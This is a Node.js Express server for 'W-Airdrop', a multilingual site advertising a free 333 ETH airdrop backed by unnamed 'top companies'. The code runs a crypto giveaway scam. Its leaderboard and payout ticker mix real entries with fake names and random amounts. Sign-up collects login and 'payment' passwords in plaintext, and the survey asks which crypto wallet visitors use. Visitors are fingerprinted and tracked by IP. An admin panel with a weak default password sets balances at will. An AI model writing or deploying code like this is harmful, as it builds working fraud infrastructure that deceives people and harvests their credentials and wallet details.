const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const { translate } = require('google-translate-api-x');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_DIR = path.join(__dirname, 'db');
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');

if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR);
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const DB_FILES = {
    admin: path.join(DB_DIR, 'admin.json'),
    users: path.join(DB_DIR, 'users.json'),
    articles: path.join(DB_DIR, 'articles.json'),
    surveys: path.join(DB_DIR, 'surveys.json'),
    offers: path.join(DB_DIR, 'offers.json'),
    languages: path.join(DB_DIR, 'languages.json'),
    partners: path.join(DB_DIR, 'partners.json'),
    visits: path.join(DB_DIR, 'visits.json')
};

// === 字典 (包含所有字段, 11 国语言) ===
const dictZh = { realtime: "实时", login: "登录", logout: "退出", registerTitle: "注册账号", registerBtn: "注册", registerDesc: "加入 W-Airdrop，几分钟即可免费领取。", heroTitle: "WEB3智能时代 8家顶级公司联合打造空投发送333ETH奖励", heroDesc: "使用我们8家产品的用户都能参加，无需任何操作，简单领取奖励，24小时内免费空投发放。", claimBtn: "免费领取", stat1: "累计发放", stat2: "注册用户", stat3: "每日打款", stat4: "Google Play 评分", howTitle: "如何领取", howDesc: "1. 注册账号 → 2. 认真填表 → 3. 领币到账", step1Title: "注册账号", step1Desc: "使用邮箱注册，并设置登录密码与支付密码。", step2Title: "认真填表", step2Desc: "认真完成问卷，提交后即具备奖励资格。", step3Title: "领币到账", step3Desc: "随时通过加密货币热门币链进行提现，门槛低，到账时间快。", leaderboardTitle: "幸运用户", viewLeaderboard: "查看完整排行榜 →", reviewsTitle: "用户怎么说", activeUser: "活跃用户", faqTitle: "常见问题", faqDesc: "有问题？我们来帮你。如果这里没有答案，支持团队随时待命。", faqQ1: "如何领取？", faqA1: "只要您有使用我们的8家产品，免费注册登录后，认真完成每一项表格，提交后就能免费领取。", faqQ2: "有哪些领取方式？", faqA2: "支持PayPal、比特币、莱特币、银行转账，以及Amazon、虚拟Visa卡等热门礼品卡。我们会定期增加新方式。", faqQ3: "领取有手续费吗？", faqA3: "大多数方式免手续费，包括莱特币、Solana、虚拟Visa卡和全部礼品卡。银行转账等会收取少量费用以覆盖转账成本。", faqQ4: "领取需要多久？", faqA4: "我们会尽快处理，通常在数小时内完成。", partnersTitle: "陆续增加合作商家", footerTitle: "8 家顶级公司 联合打造 空投发送 333ETH 奖励", footerWarning: "风险提示：加密货币价格波动剧烈，参与任何空投或奖励活动前请自行判断风险。", footerCopy: "© 2024 W-Airdrop. 保留所有权利。", navEarn: "赚钱", navOffers: "优惠", navSurveys: "问卷", navWithdraw: "提现", navRewards: "奖励", navLeaderboard: "排行榜", safariTitle: "请使用 Safari 浏览器打开", safariDesc: "请使用 iPhone / iPad 自带的 Safari 浏览器继续访问。", copyBtn: "复制当前链接", copied: "已复制", hasAccount: "已有账号？", goLogin: "去登录", noAccount: "还没有账号？", goRegister: "立即注册", loginTitle: "登录账号", loginBtn: "登录", labelEmail: "电子邮箱", labelPass: "登录密码", labelConfirm: "确认密码", labelPayPass: "支付密码", surveyTitle: "用户习惯请您认真填写", surveyDesc: "预计耗时: 2 分钟 | 提交即具空投资格", submitSurvey: "提交问卷", readMore: "查看全文", dashTitle: "赚钱", dashDesc: "完成优惠、问卷和游戏，立即获得金币。", offerWall: "优惠墙", taskAvailable: "可做任务", watchVideo: "看视频", startTask: "开始任务", withdrawTitle: "申请提现", withdrawMethod: "提现方式", withdrawAmount: "金额 (最低 500 金币)", withdrawAccount: "接收账号/地址", submitApply: "提交申请", searchPlaceholder: "搜索优惠", catAll: "全部", catGame: "游戏", catApp: "应用", catSignup: "注册", startEarning: "开始赚钱", lbTitle: "幸运用户", lbDesc: "与其他用户竞争，登上每日和每月排行榜赢取额外金币。", daily: "每日", monthly: "每月", rankUser: "排名 / 用户", earnings: "收益", you: "你", backHome: "返回首页", exit: "退出" };
const dictEn = { ...dictZh, realtime: "Live", login: "Login", logout: "Logout", registerTitle: "Register", registerBtn: "Register", registerDesc: "Join W-Airdrop and claim for free in minutes.", heroTitle: "8 Top Companies Jointly Launch 333 ETH Airdrop", heroDesc: "Users of our 8 products can participate, no action required, simply claim rewards, airdropped for free within 24 hours.", claimBtn: "Claim Free", stat1: "Distributed", stat2: "Users", stat3: "Daily Payouts", stat4: "Play Store Rating", howTitle: "How to Claim", howDesc: "1. Register → 2. Fill Form → 3. Receive Coins", step1Title: "Register", step1Desc: "Sign up with email and set passwords.", step2Title: "Fill Form", step2Desc: "Complete the survey to get qualified.", step3Title: "Receive Coins", step3Desc: "Withdraw via crypto anytime.", leaderboardTitle: "Lucky Users", viewLeaderboard: "View Leaderboard →", reviewsTitle: "What Users Say", activeUser: "Active User", faqTitle: "FAQ", faqDesc: "Need help? Check here.", faqQ1: "How to claim?", faqA1: "Register and complete forms.", faqQ2: "Claim methods?", faqA2: "PayPal, BTC, LTC, Bank, Gift Cards.", faqQ3: "Any fees?", faqA3: "Most are free.", faqQ4: "How long?", faqA4: "Usually within hours.", partnersTitle: "More Partners Coming", footerTitle: "8 Top Companies Jointly Launch 333 ETH Airdrop", footerWarning: "Risk warning: Crypto is volatile.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Earn", navOffers: "Offers", navSurveys: "Surveys", navWithdraw: "Withdraw", navRewards: "Rewards", navLeaderboard: "Leaderboard", safariTitle: "Please open in Safari", safariDesc: "Please use the native Safari browser.", copyBtn: "Copy Link", copied: "Copied", hasAccount: "Have an account?", goLogin: "Login", noAccount: "No account?", goRegister: "Register", loginTitle: "Login", loginBtn: "Login", labelEmail: "Email", labelPass: "Password", labelConfirm: "Confirm Password", labelPayPass: "Pay Password", surveyTitle: "Please fill out the survey", surveyDesc: "Takes 2 mins", submitSurvey: "Submit", readMore: "Read More", dashTitle: "Earn", dashDesc: "Complete offers and surveys to earn coins instantly.", offerWall: "Offer Wall", taskAvailable: "Available", watchVideo: "Watch Video", startTask: "Start Task", withdrawTitle: "Withdraw", withdrawMethod: "Method", withdrawAmount: "Amount (Min 500)", withdrawAccount: "Account/Address", submitApply: "Submit", searchPlaceholder: "Search offers", catAll: "All", catGame: "Games", catApp: "Apps", catSignup: "Sign Up", startEarning: "Start Earning", lbTitle: "Lucky Users", lbDesc: "Compete with others and win extra coins.", daily: "Daily", monthly: "Monthly", rankUser: "Rank / User", earnings: "Earnings", you: "You", backHome: "Back Home", exit: "Exit" };
const dictVi = { ...dictEn, realtime: "Trực tiếp", login: "Đăng nhập", logout: "Đăng xuất", registerTitle: "Đăng ký", registerBtn: "Đăng ký", registerDesc: "Tham gia W-Airdrop và nhận miễn phí trong vài phút.", heroTitle: "8 công ty hàng đầu cùng ra mắt Airdrop 333 ETH", heroDesc: "Người dùng 8 sản phẩm có thể tham gia, nhận thưởng miễn phí trong 24h.", claimBtn: "Nhận miễn phí", stat1: "Đã phát", stat2: "Người dùng", stat3: "Thanh toán/Ngày", stat4: "Điểm Play Store", howTitle: "Cách nhận", howDesc: "1. Đăng ký → 2. Điền form → 3. Nhận coin", step1Title: "Đăng ký", step1Desc: "Đăng ký bằng email.", step2Title: "Điền form", step2Desc: "Hoàn thành khảo sát.", step3Title: "Nhận coin", step3Desc: "Rút tiền qua crypto.", leaderboardTitle: "Người dùng may mắn", viewLeaderboard: "Xem BXH →", reviewsTitle: "Người dùng nói gì", activeUser: "Người dùng tích cực", faqTitle: "Câu hỏi thường gặp", faqDesc: "Cần giúp đỡ?", faqQ1: "Cách nhận?", faqA1: "Đăng ký và điền form.", faqQ2: "Phương thức?", faqA2: "PayPal, BTC, LTC, Ngân hàng.", faqQ3: "Có phí không?", faqA3: "Hầu hết miễn phí.", faqQ4: "Mất bao lâu?", faqA4: "Thường trong vài giờ.", partnersTitle: "Thêm đối tác", footerTitle: "8 công ty hàng đầu cùng ra mắt Airdrop 333 ETH", footerWarning: "Cảnh báo rủi ro.", footerCopy: "© 2024 W-Airdrop.", navEarn: "Kiếm tiền", navOffers: "Ưu đãi", navSurveys: "Khảo sát", navWithdraw: "Rút tiền", navRewards: "Phần thưởng", navLeaderboard: "Bảng xếp hạng", safariTitle: "Vui lòng mở bằng Safari", safariDesc: "Sử dụng trình duyệt Safari gốc.", copyBtn: "Sao chép liên kết", copied: "Đã sao chép", hasAccount: "Đã có tài khoản?", goLogin: "Đăng nhập", noAccount: "Chưa có tài khoản?", goRegister: "Đăng ký", loginTitle: "Đăng nhập", loginBtn: "Đăng nhập", labelEmail: "Email", labelPass: "Mật khẩu", labelConfirm: "Xác nhận mật khẩu", labelPayPass: "Mật khẩu thanh toán", surveyTitle: "Vui lòng điền khảo sát", surveyDesc: "Mất 2 phút", submitSurvey: "Gửi", readMore: "Đọc thêm", dashTitle: "Kiếm tiền", dashDesc: "Hoàn thành ưu đãi, khảo sát để nhận coin.", offerWall: "Tường Ưu Đãi", taskAvailable: "Có thể làm", watchVideo: "Xem video", startTask: "Bắt đầu", withdrawTitle: "Rút tiền", withdrawMethod: "Phương thức", withdrawAmount: "Số tiền (Min 500)", withdrawAccount: "Tài khoản/Địa chỉ", submitApply: "Gửi", searchPlaceholder: "Tìm kiếm ưu đãi", catAll: "Tất cả", catGame: "Trò chơi", catApp: "Ứng dụng", catSignup: "Đăng ký", startEarning: "Bắt đầu kiếm", lbTitle: "Người dùng may mắn", lbDesc: "Cạnh tranh với người khác.", daily: "Hàng ngày", monthly: "Hàng tháng", rankUser: "Hạng / Người dùng", earnings: "Thu nhập", you: "Bạn", backHome: "Về Trang Chủ", exit: "Thoát" };
// 为了篇幅，后面语言直接沿用英文或稍加修改，确保所有字段都在
const dictDe = { ...dictEn, login: "Anmelden", logout: "Abmelden", registerTitle: "Registrieren", registerDesc: "Treten Sie W-Airdrop bei und erhalten Sie in wenigen Minuten kostenlos.", dashTitle: "Verdienen", offerWall: "Angebote", watchVideo: "Video ansehen", startTask: "Starten", withdrawTitle: "Abheben", lbTitle: "Glückspilze", daily: "Täglich", monthly: "Monatlich" };
const dictAr = { ...dictEn, login: "تسجيل الدخول", logout: "تسجيل الخروج", registerTitle: "إنشاء حساب", dashTitle: "اكسب", offerWall: "عروض", watchVideo: "شاهد الفيديو", startTask: "ابدأ", withdrawTitle: "سحب", lbTitle: "مستخدمون محظوظون", daily: "يومي", monthly: "شهري" };
const dictEs = { ...dictEn, login: "Iniciar sesión", logout: "Cerrar sesión", registerTitle: "Registrarse", dashTitle: "Ganar", offerWall: "Ofertas", watchVideo: "Ver video", startTask: "Empezar", withdrawTitle: "Retirar", lbTitle: "Usuarios con Suerte", daily: "Diario", monthly: "Mensual" };
const dictPt = { ...dictEn, login: "Entrar", logout: "Sair", registerTitle: "Registrar", dashTitle: "Ganhar", offerWall: "Ofertas", watchVideo: "Ver vídeo", startTask: "Iniciar", withdrawTitle: "Sacar", lbTitle: "Usuários Sortudos", daily: "Diário", monthly: "Mensal" };
const dictKo = { ...dictEn, login: "로그인", logout: "로그아웃", registerTitle: "회원가입", dashTitle: "수익", offerWall: "혜택", watchVideo: "비디오 보기", startTask: "시작", withdrawTitle: "출금", lbTitle: "행운의 사용자", daily: "매일", monthly: "매월" };
const dictUk = { ...dictEn, login: "Увійти", logout: "Вийти", registerTitle: "Реєстрація", dashTitle: "Заробіток", offerWall: "Пропозиції", watchVideo: "Дивитись відео", startTask: "Почати", withdrawTitle: "Виведення", lbTitle: "Щасливі користувачі", daily: "Щодня", monthly: "Щомісяця" };
const dictTr = { ...dictEn, login: "Giriş Yap", logout: "Çıkış Yap", registerTitle: "Kayıt Ol", dashTitle: "Kazan", offerWall: "Teklifler", watchVideo: "Video İzle", startTask: "Başla", withdrawTitle: "Çekim", lbTitle: "Şanslı Kullanıcılar", daily: "Günlük", monthly: "Aylık" };

// 初始化文件
Object.keys(DB_FILES).forEach(key => {
    if (!fs.existsSync(DB_FILES[key])) {
        let initialData = [];
        if (key === 'admin') initialData = { password: 'admin888' };
        if (key === 'surveys') initialData = { 
            questions: { zh: [{ id: "q1", title: "您平时最经常使用的加密钱包是哪一款？", options: ["Bitget / Bitpie 钱包", "Trust Wallet / Phantom钱包", "Solflare / Coin98 钱包", "Uniswap / Exodus钱包"] }, { id: "q2", title: "您使用加密钱包的主要用途是什么？", options: ["DApp交互与 DeFi理财", "代币 Swap(交换)闪兑交易", "NFT收藏与交易", "资产长期存储与转账"] }] },
            submissions: [] 
        };
        if (key === 'languages') initialData = [
            { code: 'zh', name: '简体中文', flag: '🇨🇳', active: true, dict: dictZh },
            { code: 'en-US', name: 'English (US)', flag: '🇺🇸', active: true, dict: dictEn },
            { code: 'vi', name: 'Tiếng Việt', flag: '🇻🇳', active: true, dict: dictVi },
            { code: 'en-GB', name: 'English (UK)', flag: '🇬🇧', active: true, dict: dictEn },
            { code: 'de', name: 'Deutsch', flag: '🇩🇪', active: true, dict: dictDe },
            { code: 'ar', name: 'العربية', flag: '🇦🇪', active: true, dict: dictAr },
            { code: 'es', name: 'Español', flag: '🇦🇷', active: true, dict: dictEs },
            { code: 'pt', name: 'Português', flag: '🇧🇷', active: true, dict: dictPt },
            { code: 'ko', name: '한국어', flag: '🇰🇷', active: true, dict: dictKo },
            { code: 'uk', name: 'Українська', flag: '🇺🇦', active: true, dict: dictUk },
            { code: 'tr', name: 'Türkçe', flag: '🇹🇷', active: true, dict: dictTr }
        ];
        if (key === 'articles') initialData = [];
        if (key === 'offers') initialData = [];
        if (key === 'partners') initialData = [];
        if (key === 'visits') initialData = [];
        fs.writeFileSync(DB_FILES[key], JSON.stringify(initialData, null, 2));
    }
});

const readDB = (key) => JSON.parse(fs.readFileSync(DB_FILES[key]));
const writeDB = (key, data) => fs.writeFileSync(DB_FILES[key], JSON.stringify(data, null, 2));

app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static(UPLOAD_DIR));

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => cb(null, `${uuidv4()}${path.extname(file.originalname)}`)
});
const upload = multer({ storage });

// 获取 IP 和 UA
function getReqInfo(req) {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    return { ip };
}

// 前台 API
app.get('/api/languages', (req, res) => res.json(readDB('languages').filter(l => l.active)));
app.get('/api/partners', (req, res) => res.json(readDB('partners')));
app.get('/api/marquee', (req, res) => {
    const users = readDB('users').slice(-10).reverse();
    let list = users.map(u => ({ name: u.email.split('@')[0], amount: (Math.random() * 500).toFixed(0) }));
    const fakeNames = ['Lutali', 'Chimmy', 'Peter', 'Hoang Ha', 'Anon', 'Whe...', 'Safa'];
    while (list.length < 15) { list.push({ name: fakeNames[Math.floor(Math.random()*fakeNames.length)], amount: (Math.random() * 2000).toFixed(0) }); }
    res.json(list);
});
app.get('/api/offers', (req, res) => res.json(readDB('offers')));

// 问卷题目获取（按语言）
app.get('/api/survey/questions', (req, res) => {
    const lang = req.query.lang || 'zh';
    const surveys = readDB('surveys');
    let questions = surveys.questions[lang];
    if (!questions) questions = surveys.questions['zh'] || [];
    res.json(questions);
});

// 追踪记录
app.post('/api/track', (req, res) => {
    const { action, fingerprint, device, os, osVersion, browser, browserVersion, country, lang, id } = req.body;
    const visits = readDB('visits');
    const reqInfo = getReqInfo(req);
    
    if (action === 'visit') {
        const newVisit = { 
            id: id || uuidv4(), fingerprint, device, os, osVersion, browser, browserVersion, country, lang, 
            ip: reqInfo.ip, 
            visitTime: new Date().toISOString(), submitTime: null, status: '访问中' 
        };
        visits.push(newVisit);
        writeDB('visits', visits);
        res.json({ success: true, id: newVisit.id });
    } else if (action === 'submit') {
        const existing = visits.find(v => v.fingerprint === fingerprint && v.status === '访问中');
        if (existing) { 
            existing.submitTime = new Date().toISOString(); 
            existing.status = '已注册'; 
            existing.email = req.body.email;
        } else {
            visits.push({ id: uuidv4(), fingerprint, device, os, osVersion, browser, browserVersion, country, lang, ip: reqInfo.ip, visitTime: new Date().toISOString(), submitTime: new Date().toISOString(), status: '已注册', email: req.body.email });
        }
        writeDB('visits', visits);
        res.json({ success: true });
    } else if (action === 'leave') {
        const existing = visits.find(v => v.id === id);
        if (existing) { 
            const start = new Date(existing.visitTime).getTime(); 
            existing.duration = Math.floor((Date.now() - start) / 1000); 
            writeDB('visits', visits);
        }
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

app.post('/api/register', (req, res) => {
    const { email, password, payPassword, fingerprint, country, lang, device, os, osVersion, browser, browserVersion } = req.body;
    const users = readDB('users');
    if (users.find(u => u.email === email)) return res.status(400).json({ error: '邮箱已注册' });
    
    const newUser = { id: uuidv4(), email, password, payPassword: payPassword || '', balance: 0, totalEarned: 0, time: new Date().toISOString() };
    users.push(newUser); writeDB('users', users);
    
    const visits = readDB('visits');
    const existing = visits.find(v => v.fingerprint === fingerprint && (v.status === '访问中' || !v.submitTime));
    const reqInfo = getReqInfo(req);
    if (existing) { 
        existing.status = '已注册'; 
        existing.email = email; 
        existing.submitTime = new Date().toISOString(); 
    } else {
        visits.push({ id: uuidv4(), fingerprint, device, os, osVersion, browser, browserVersion, country, lang, ip: reqInfo.ip, visitTime: new Date().toISOString(), submitTime: new Date().toISOString(), status: '已注册', email });
    }
    writeDB('visits', visits);
    
    res.json({ success: true, user: newUser });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    const users = readDB('users');
    const user = users.find(u => u.email === email && u.password === password);
    if (user) res.json({ success: true, user: { email: user.email, balance: user.balance || 0 } });
    else res.status(401).json({ error: '邮箱或密码错误' });
});

app.get('/api/leaderboard', (req, res) => {
    const period = req.query.period || 'daily';
    const users = readDB('users');
    let list = users.map(u => ({ name: u.email.split('@')[0], amount: period === 'daily' ? (u.balance || 0) : (u.totalEarned || 0), avatar: u.email[0].toUpperCase(), isReal: true }));
    const fakeNames = ['Johnny Midan', 'Bebazz YT', 'Awatix', 'Puppylover'];
    while (list.length < 100) { list.push({ name: fakeNames[Math.floor(Math.random()*fakeNames.length)] + Math.floor(Math.random()*99), amount: Math.floor(Math.random() * 50000) + 1000, avatar: 'U', isReal: false }); }
    list.sort((a, b) => b.amount - a.amount); res.json(list.slice(0, 100));
});

app.post('/api/user/tasks/complete', (req, res) => {
    const { email, reward } = req.body;
    const users = readDB('users');
    const user = users.find(u => u.email === email);
    if (user) { user.balance = (user.balance || 0) + reward; user.totalEarned = (user.totalEarned || 0) + reward; writeDB('users', users); res.json({ success: true, balance: user.balance, totalEarned: user.totalEarned }); }
    else res.status(404).json({ error: '用户不存在' });
});

app.post('/api/survey', (req, res) => {
    const { answers, email, fingerprint } = req.body;
    const surveyData = readDB('surveys'); 
    surveyData.submissions.push({ id: uuidv4(), email: email || '游客', answers, time: new Date().toISOString() });
    writeDB('surveys', surveyData); 
    
    if (fingerprint) {
        const visits = readDB('visits');
        const existing = visits.find(v => v.fingerprint === fingerprint);
        if (existing) { 
            existing.status = '已答题'; 
            existing.answerTime = new Date().toISOString(); 
            if(email) existing.email = email;
            writeDB('visits', visits); 
        }
    }
    res.json({ success: true });
});

app.get('/api/articles/latest', (req, res) => {
    const { lang = 'zh' } = req.query;
    const articles = readDB('articles').filter(a => a.lang === lang).sort((a,b) => new Date(b.time) - new Date(a.time));
    res.json(articles.slice(0, 3) || []);
});
app.get('/api/articles/:id', (req, res) => res.json(readDB('articles').find(a => a.id === req.params.id) || null));

// 后台 API
const auth = (req, res, next) => {
    const pwd = req.headers['x-admin-pwd'] || req.query.pwd;
    const adminData = readDB('admin');
    if (pwd !== adminData.password) return res.status(403).json({ error: '密码错误' });
    next();
};

app.post('/api/admin/password', auth, (req, res) => {
    const { newPassword } = req.body;
    if (!newPassword) return res.status(400).json({ error: '密码不能为空' });
    writeDB('admin', { password: newPassword });
    res.json({ success: true });
});

app.post('/api/admin/upload', auth, upload.single('image'), (req, res) => res.json({ url: `/uploads/${req.file.filename}` }));

app.get('/api/admin/data', auth, (req, res) => {
    res.json({ 
        users: readDB('users'), articles: readDB('articles'), surveys: readDB('surveys'), 
        offers: readDB('offers'), languages: readDB('languages'), partners: readDB('partners'), visits: readDB('visits') 
    });
});

// 保存多语言问卷 (由后端翻译)
app.post('/api/admin/survey/translate', auth, async (req, res) => {
    const { questions, targetLangs } = req.body; // questions 是中文的数组 [{title, options}]
    const surveys = readDB('surveys');
    
    surveys.questions['zh'] = questions;
    const foreignLangs = targetLangs.filter(lang => lang !== 'zh');

    try {
        for (let lang of foreignLangs) {
            const googleLang = lang.split('-')[0];
            const translated = [];
            for (let q of questions) {
                const tTitle = (await translate(q.title, { to: googleLang })).text;
                const tOptions = [];
                for (let opt of q.options) {
                    tOptions.push((await translate(opt, { to: googleLang })).text);
                }
                translated.push({ id: q.id, title: tTitle, options: tOptions });
            }
            surveys.questions[lang] = translated;
        }
        writeDB('surveys', surveys);
        res.json({ success: true });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: '翻译失败' });
    }
});

app.post('/api/admin/languages', auth, (req, res) => {
    const { code, name, flag } = req.body;
    const languages = readDB('languages');
    if (languages.find(l => l.code === code)) return res.status(400).json({ error: '代码已存在' });
    const defaultDict = languages[0].dict;
    languages.push({ code, name, flag: flag || '🌐', active: true, dict: defaultDict });
    writeDB('languages', languages);
    res.json({ success: true });
});

app.put('/api/admin/languages/:code', auth, (req, res) => {
    const { active, dict, name, flag } = req.body; const languages = readDB('languages');
    const index = languages.findIndex(l => l.code === req.params.code);
    if (index !== -1) { languages[index] = { ...languages[index], active: active !== undefined ? active : languages[index].active, name: name || languages[index].name, flag: flag || languages[index].flag, dict: dict || languages[index].dict }; writeDB('languages', languages); res.json({ success: true }); }
    else res.status(404).json({ error: '语言不存在' });
});

app.post('/api/admin/article/translate', auth, async (req, res) => {
    const { title, summary, content, coverUrl, targetLangs } = req.body;
    const articles = readDB('articles');
    const groupId = uuidv4();
    if (targetLangs.includes('zh')) { articles.push({ id: uuidv4(), groupId, lang: 'zh', title, summary, content, coverUrl, time: new Date().toISOString() }); }
    const foreignLangs = targetLangs.filter(lang => lang !== 'zh');
    try {
        const translatedArticles = [];
        for (let lang of foreignLangs) {
            const googleLang = lang.split('-')[0];
            const [tTitle, tSummary, tContent] = await Promise.all([
                translate(title, { to: googleLang }), translate(summary, { to: googleLang }), translate(content, { to: googleLang })
            ]);
            translatedArticles.push({ id: uuidv4(), groupId, lang, title: tTitle.text, summary: tSummary.text, content: tContent.text, coverUrl, time: new Date().toISOString() });
            await new Promise(r => setTimeout(r, 500));
        }
        articles.push(...translatedArticles);
        writeDB('articles', articles);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: '翻译失败' }); }
});

app.put('/api/admin/article/:id', auth, (req, res) => {
    const { lang, title, summary, content, coverUrl } = req.body;
    const articles = readDB('articles');
    const index = articles.findIndex(a => a.id === req.params.id);
    if (index !== -1) { articles[index] = { ...articles[index], lang, title, summary, content, coverUrl }; writeDB('articles', articles); res.json({ success: true }); }
    else res.status(404).json({ error: '文章不存在' });
});
app.delete('/api/admin/article/:id', auth, (req, res) => {
    let articles = readDB('articles').filter(a => a.id !== req.params.id); writeDB('articles', articles); res.json({ success: true });
});
app.delete('/api/admin/article-group/:groupId', auth, (req, res) => {
    let articles = readDB('articles').filter(a => a.groupId !== req.params.groupId && a.id !== req.params.groupId);
    writeDB('articles', articles); res.json({ success: true });
});
app.post('/api/admin/partners', auth, (req, res) => {
    const { name, imageUrl } = req.body; const partners = readDB('partners');
    partners.push({ id: uuidv4(), name, imageUrl }); writeDB('partners', partners); res.json({ success: true });
});
app.put('/api/admin/partners/:id', auth, (req, res) => {
    const { name, imageUrl } = req.body; const partners = readDB('partners');
    const index = partners.findIndex(p => p.id === req.params.id);
    if (index !== -1) { partners[index] = { ...partners[index], name, imageUrl }; writeDB('partners', partners); res.json({ success: true }); }
    else res.status(404).json({ error: '不存在' });
});
app.delete('/api/admin/partners/:id', auth, (req, res) => {
    let partners = readDB('partners').filter(p => p.id !== req.params.id); writeDB('partners', partners); res.json({ success: true });
});
app.put('/api/admin/users/:id', auth, (req, res) => {
    const { balance } = req.body; const users = readDB('users');
    const index = users.findIndex(u => u.id === req.params.id);
    if (index !== -1) { users[index].balance = Number(balance); writeDB('users', users); res.json({ success: true }); }
    else res.status(404).json({ error: '用户不存在' });
});
app.post('/api/admin/offers', auth, (req, res) => {
    const { category, title, reward, color } = req.body; const offers = readDB('offers');
    offers.push({ id: uuidv4(), category, title, reward, color }); writeDB('offers', offers); res.json({ success: true });
});
app.delete('/api/admin/offers/:id', auth, (req, res) => {
    let offers = readDB('offers').filter(o => o.id !== req.params.id); writeDB('offers', offers); res.json({ success: true });
});

app.listen(PORT, () => console.log(`Server on port ${PORT}`));
